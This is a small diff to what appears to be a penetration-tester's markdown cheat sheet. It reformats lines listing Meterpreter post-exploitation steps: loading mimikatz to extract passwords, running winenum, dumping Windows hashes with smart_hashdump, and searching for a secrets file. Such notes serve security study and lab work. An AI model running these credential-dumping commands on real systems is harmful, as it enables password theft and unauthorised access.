@@ -36,10 +36,10 @@ migrate
 search -f network-secret.txt
 shell
 ```
-* Load mimikatz (needs SYSTEM privs; better migrate to 64bit process): `load mimikatz`, then use `msv`, `kerberos`, `wdigest` for extracting passwords.  
-* Post-exploitation module: `run winenum` script.  
-* Windows hashes: `run post/windows/gather/smart_hashdump`  
 
+* Load mimikatz (needs SYSTEM privs; better migrate to 64bit process): `load mimikatz`, then use `msv`, `kerberos`, `wdigest` for extracting passwords.
+* Post-exploitation module: `run winenum` script.
+* Windows hashes: `run post/windows/gather/smart_hashdump`
 * [Web Delivery explained](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) //tip: check if there's port added in the payload URL
 
 msfvenom
